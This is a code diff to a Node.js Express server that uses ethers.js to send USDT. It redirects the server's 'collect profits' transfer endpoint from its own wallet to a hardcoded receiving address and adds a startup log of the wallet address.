@@ -32,6 +32,8 @@ if (!privateKey) {
 const wallet = new ethers.Wallet(privateKey, provider);
 const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, wallet);
 
+console.log("🎯 Your wallet address is:", wallet.address);
+
 // API: عنوان المحفظة
 app.get('/wallet-address', (req, res) => {
   console.log("GET /wallet-address");
@@ -56,24 +58,29 @@ app.get('/balance', async (req, res) => {
   }
 });
 
-// API: جمع الأرباح → ترسل دائمًا إلى نفس المحفظة (wallet.address)
+// API: جمع الأرباح → ترسل دائمًا إلى محفظتك الخاصة
 app.post('/send-usdt', async (req, res) => {
   console.log("POST /send-usdt", req.body);
+
   try {
     const { amount } = req.body;
+
     if (!amount || amount <= 0) {
       return res.status(400).json({ success: false, error: 'Amount must be > 0' });
     }
 
-    const to = wallet.address;
-    const amountWei = ethers.parseUnits(amount.toString(), 18);
-    console.log(`Transferring ${amount} USDT to ${to}`);
+    // 🟢 المحفظة التي تستلم الأرباح (محفظتك الخاصة)
+    const receiverAddress = '0x1cF14e559b8dD7d32c2Ef8fcD6D2C3e6FbB95141';
 
-    const tx = await usdtContract.transfer(to, amountWei);
+    const amountWei = ethers.parseUnits(amount.toString(), 18);
+    console.log(`Transferring ${amount} USDT to ${receiverAddress}`);
+
+    const tx = await usdtContract.transfer(receiverAddress, amountWei);
     await tx.wait();
 
     console.log("Transaction hash:", tx.hash);
     res.json({ success: true, txHash: tx.hash });
+
   } catch (err) {
     console.error("Error in send-usdt:", err.message);
     res.status(500).json({ success: false, error: err.message });
